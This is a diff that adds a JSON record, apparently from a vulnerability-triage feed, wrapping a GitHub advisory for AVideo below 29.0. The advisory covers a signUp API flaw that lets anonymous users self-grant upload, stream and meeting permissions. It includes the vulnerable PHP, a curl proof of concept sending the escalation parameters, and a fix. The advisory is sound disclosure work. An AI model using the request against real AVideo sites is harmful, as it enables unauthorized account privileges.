@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/114768995?v=4\", \"events_url\": \"https://api.github.com/users/offset/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/offset/followers\", \"following_url\": \"https://api.github.com/users/offset/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/offset/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/offset\", \"id\": 114768995, \"login\": \"offset\", \"node_id\": \"U_kgDOBtc8Yw\", \"organizations_url\": \"https://api.github.com/users/offset/orgs\", \"received_events_url\": \"https://api.github.com/users/offset/received_events\", \"repos_url\": \"https://api.github.com/users/offset/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/offset/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/offset/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/offset\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-33684\", \"cvss\": {\"score\": 5.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 5.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-862\", \"name\": \"Missing Authorization\"}], \"description\": \"## Summary\\n\\nThe `set_api_signUp` method in the API plugin accepts `emailVerified`, `canUpload`, `canStream`, and `canCreateMeet` parameters from user-supplied input and applies them to newly created accounts without verifying that the request was authenticated with a valid APISecret. Any anonymous user who can solve a CAPTCHA can self-grant elevated permissions during account registration.\\n\\n## Details\\n\\nThe authentication check in `set_api_signUp` (`plugin/API/API.php:4222`) allows either a valid APISecret (admin-level credential) or a solved CAPTCHA (anonymous access):\\n\\n```php\\n// plugin/API/API.php:4222-4232\\nif ($obj->APISecret !== @$_REQUEST['APISecret']) {\\n    if(empty($_REQUEST['captcha'])){\\n        return new ApiObject(\\\"Captcha is required\\\");\\n    }\\n    require_once $global['systemRootPath'] . 'objects/captcha.php';\\n    $valid = Captcha::validation($_REQUEST['captcha']);\\n    if(!$valid){\\n        return new ApiObject(\\\"Captcha is wrong, reload it and try again\\\");\\n    }\\n}\\n```\\n\\nAfter this check, both code paths (APISecret and CAPTCHA) reach the privilege parameter handling unconditionally:\\n\\n```php\\n// plugin/API/API.php:4238-4249\\nif (isset($_REQUEST['emailVerified'])) {\\n    $global['emailVerified'] = intval($_REQUEST['emailVerified']);\\n}\\nif (isset($_REQUEST['canCreateMeet'])) {\\n    $global['canCreateMeet'] = intval($_REQUEST['canCreateMeet']);\\n}\\nif (isset($_REQUEST['canStream'])) {\\n    $global['canStream'] = intval($_REQUEST['canStream']);\\n}\\nif (isset($_REQUEST['canUpload'])) {\\n    $global['canUpload'] = intval($_REQUEST['canUpload']);\\n}\\n```\\n\\nThese `$global` values are then consumed by `User::save()` (`objects/user.php:829-840`), which overrides the user object's permission fields:\\n\\n```php\\n// objects/user.php:829-840\\nif (isset($global['emailVerified'])) {\\n    $this->emailVerified = $global['emailVerified'];\\n}\\nif (isset($global['canCreateMeet'])) {\\n    $this->canCreateMeet = $global['canCreateMeet'];\\n}\\nif (isset($global['canStream'])) {\\n    $this->canStream = $global['canStream'];\\n}\\nif (isset($global['canUpload'])) {\\n    $this->canUpload = $global['canUpload'];\\n}\\n```\\n\\nNote that even though `userCreate.json.php:90` sets `canUpload` from the site's default configuration, `User::save()` subsequently overrides it with the attacker-controlled `$global` value.\\n\\nThe codebase already uses `self::isAPISecretValid()` to guard admin-only operations in other API methods (e.g., lines 294, 991, 1664, 2150), but this check is missing for the privilege parameters in `set_api_signUp`.\\n\\n## PoC\\n\\n```bash\\n# Step 1: Get a CAPTCHA token\\n# (Navigate to the signup page in a browser, solve the CAPTCHA, capture the token)\\n\\n# Step 2: Register with elevated privileges\\ncurl -X POST 'https://target/plugin/API/set.json.php' \\\\\\n  -d 'APIName=signUp' \\\\\\n  -d 'user=attacker' \\\\\\n  -d 'pass=Password123!' \\\\\\n  -d 'email=attacker@example.com' \\\\\\n  -d 'name=Attacker' \\\\\\n  -d 'captcha=VALID_CAPTCHA_TOKEN' \\\\\\n  -d 'emailVerified=1' \\\\\\n  -d 'canUpload=1' \\\\\\n  -d 'canStream=1' \\\\\\n  -d 'canCreateMeet=1'\\n\\n# Expected: Account created with default (restricted) permissions\\n# Actual: Account created with upload, stream, and meet permissions enabled,\\n#         plus email marked as verified\\n\\n# Step 3: Verify elevated permissions by logging in and checking profile\\ncurl -X POST 'https://target/plugin/API/set.json.php' \\\\\\n  -d 'APIName=signIn' \\\\\\n  -d 'user=attacker' \\\\\\n  -d 'pass=Password123!'\\n# Response will show canUpload=1, canStream=1, canCreateMeet=1, emailVerified=1\\n```\\n\\n## Impact\\n\\n- **Email verification bypass:** Attackers can mark their accounts as email-verified without owning the email address, bypassing any email-gated functionality\\n- **Unauthorized upload access:** Self-granted upload permissions allow uploading potentially malicious video content to the platform\\n- **Unauthorized streaming access:** Self-granted streaming permissions allow unauthorized live streaming\\n- **Unauthorized meeting creation:** Self-granted meet permissions allow creating meetings on the platform\\n- **Policy bypass:** Platform administrators who intentionally restrict these permissions for new users (e.g., requiring manual approval before granting upload rights) have their access controls circumvented\\n\\n## Recommended Fix\\n\\nWrap the privilege parameter handling in an `isAPISecretValid()` check so that only admin-authenticated requests can set these values:\\n\\n```php\\n// plugin/API/API.php — replace lines 4238-4249 with:\\nif (self::isAPISecretValid()) {\\n    if (isset($_REQUEST['emailVerified'])) {\\n        $global['emailVerified'] = intval($_REQUEST['emailVerified']);\\n    }\\n    if (isset($_REQUEST['canCreateMeet'])) {\\n        $global['canCreateMeet'] = intval($_REQUEST['canCreateMeet']);\\n    }\\n    if (isset($_REQUEST['canStream'])) {\\n        $global['canStream'] = intval($_REQUEST['canStream']);\\n    }\\n    if (isset($_REQUEST['canUpload'])) {\\n        $global['canUpload'] = intval($_REQUEST['canUpload']);\\n    }\\n}\\n```\", \"epss\": {\"percentage\": 0.00329, \"percentile\": 0.24996}, \"ghsa_id\": \"GHSA-8j8m-p79x-g4jm\", \"github_reviewed_at\": \"2026-06-22T17:25:03Z\", \"html_url\": \"https://github.com/advisories/GHSA-8j8m-p79x-g4jm\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-8j8m-p79x-g4jm\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-33684\"}], \"nvd_published_at\": null, \"published_at\": \"2026-06-22T17:25:03Z\", \"references\": [\"https://github.com/WWBN/AVideo/security/advisories/GHSA-8j8m-p79x-g4jm\", \"https://github.com/WWBN/AVideo/commit/061f242cba0e068cc1b461705fe839274b5038ff\", \"https://github.com/advisories/GHSA-8j8m-p79x-g4jm\"], \"repository_advisory_url\": \"https://api.github.com/repos/WWBN/AVideo/security-advisories/GHSA-8j8m-p79x-g4jm\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/WWBN/AVideo\", \"summary\": \"AVideo's Privilege Escalation via Unguarded Permission Parameters in signUp API Allows Self-Granting Upload/Stream/Meet Permissions\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-22T17:25:03Z\", \"url\": \"https://api.github.com/advisories/GHSA-8j8m-p79x-g4jm\", \"vulnerabilities\": [{\"first_patched_version\": \"29.0\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"wwbn/avideo\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 29.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-8j8m-p79x-g4jm",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "wwbn/avideo: < 29.0"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-33684"
+    ],
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "wwbn/avideo"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:51:57.614313Z",
+  "provenance": {
+    "content_sha256": "26c3248f14d26bee0a03d1e598a15b958d69fa2ceb7d98cd11c9171698047f96",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-06-22T17:25:03Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-8j8m-p79x-g4jm",
+  "status": "active",
+  "title": "AVideo's Privilege Escalation via Unguarded Permission Parameters in signUp API Allows Self-Granting Upload/Stream/Meet Permissions",
+  "updated_at": "2026-06-22T17:25:03Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-8j8m-p79x-g4jm"
+}
